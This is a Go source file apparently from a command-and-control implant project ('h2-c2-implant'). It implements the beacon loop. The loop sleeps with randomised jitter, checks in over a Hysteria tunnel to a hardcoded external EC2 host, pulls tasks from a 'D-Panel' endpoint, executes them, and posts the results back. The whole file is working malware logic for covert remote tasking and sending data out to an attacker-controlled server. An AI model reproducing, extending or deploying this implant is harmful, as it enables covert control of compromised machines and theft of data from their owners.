package beacon

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"h2-c2-implant/config"
	"h2-c2-implant/tasks"
	"h2-c2-implant/transport"
	"log"
	"math/big"
	"time"
)

type Beacon struct {
	tun *transport.HysteriaTunnel
	cfg *config.Config
}

type TaskRequest struct {
	ImplantID string `json:"implant_id"`
	LastSeen  int64  `json:"last_seen"`
}

type TaskResponse struct {
	Tasks []tasks.Task `json:"tasks"`
	Error string      `json:"error,omitempty"`
}

type TaskResult struct {
	TaskID   string      `json:"task_id"`
	ImplantID string     `json:"implant_id"`
	Status   string      `json:"status"` // "success", "error", "running"
	Result   interface{} `json:"result,omitempty"`
	Error    string      `json:"error,omitempty"`
	Timestamp int64     `json:"timestamp"`
}

func NewBeacon(tun *transport.HysteriaTunnel, cfg *config.Config) *Beacon {
	return &Beacon{tun: tun, cfg: cfg}
}

func (b *Beacon) Start() {
	log.Printf("[+] Starting beacon with %ds base interval ±%ds jitter", b.cfg.BaseInterval, b.cfg.Jitter)
	
	for {
		// Calculate jittered sleep time
		jitter := b.calculateJitter()
		sleepDuration := time.Duration(b.cfg.BaseInterval+jitter) * time.Second
		
		log.Printf("[+] Sleeping for %v before next checkin", sleepDuration)
		time.Sleep(sleepDuration)

		// Checkin and pull tasks from D-Panel
		if err := b.checkinAndExecute(); err != nil {
			log.Printf("[-] Checkin failed: %v", err)
			// Don't exit on failure, just continue loop
		}
	}
}

func (b *Beacon) calculateJitter() int {
	if b.cfg.Jitter <= 0 {
		return 0
	}
	
	// Generate random jitter between -Jitter and +Jitter
	n, err := rand.Int(rand.Reader, big.NewInt(int64(b.cfg.Jitter*2+1)))
	if err != nil {
		log.Printf("[-] Failed to generate jitter: %v", err)
		return 0
	}
	
	return int(n.Int64()) - b.cfg.Jitter
}

func (b *Beacon) checkinAndExecute() error {
	log.Printf("[+] Checking in with D-Panel...")
	
	// Pull pending tasks
	taskList, err := b.pullPendingTasks()
	if err != nil {
		return fmt.Errorf("failed to pull tasks: %w", err)
	}

	if len(taskList) == 0 {
		log.Printf("[+] No pending tasks")
		return nil
	}

	log.Printf("[+] Received %d tasks", len(taskList))

	// Execute each task
	for _, task := range taskList {
		log.Printf("[+] Executing task: %s (type: %s)", task.ID, task.Type)
		
		result := tasks.Execute(&task, b.tun)
		
		// Send result back to C2
		if err := b.sendResult(result); err != nil {
			log.Printf("[-] Failed to send result for task %s: %v", task.ID, err)
		} else {
			log.Printf("[+] Task %s completed successfully", task.ID)
		}
	}

	return nil
}

func (b *Beacon) pullPendingTasks() ([]tasks.Task, error) {
	// Create task request
	req := TaskRequest{
		ImplantID: b.cfg.ImplantID,
		LastSeen:  time.Now().Unix(),
	}

	reqBody, err := json.Marshal(req)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal task request: %w", err)
	}

	// Make request to D-Panel task endpoint
	resp, err := b.tun.MakeRequest("POST", 
		fmt.Sprintf("https://ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/tasks"), 
		bytes.NewReader(reqBody))
	if err != nil {
		return nil, fmt.Errorf("task request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("task endpoint returned %d", resp.StatusCode)
	}

	var taskResp TaskResponse
	if err := json.NewDecoder(resp.Body).Decode(&taskResp); err != nil {
		return nil, fmt.Errorf("failed to decode task response: %w", err)
	}

	if taskResp.Error != "" {
		return nil, fmt.Errorf("task endpoint error: %s", taskResp.Error)
	}

	return taskResp.Tasks, nil
}

func (b *Beacon) sendResult(result tasks.TaskResult) error {
	resultBody, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal task result: %w", err)
	}

	resp, err := b.tun.MakeRequest("POST",
		fmt.Sprintf("https://ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com/api/dpanel/implant/result"),
		bytes.NewReader(resultBody))
	if err != nil {
		return fmt.Errorf("result request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("result endpoint returned %d", resp.StatusCode)
	}

	return nil
}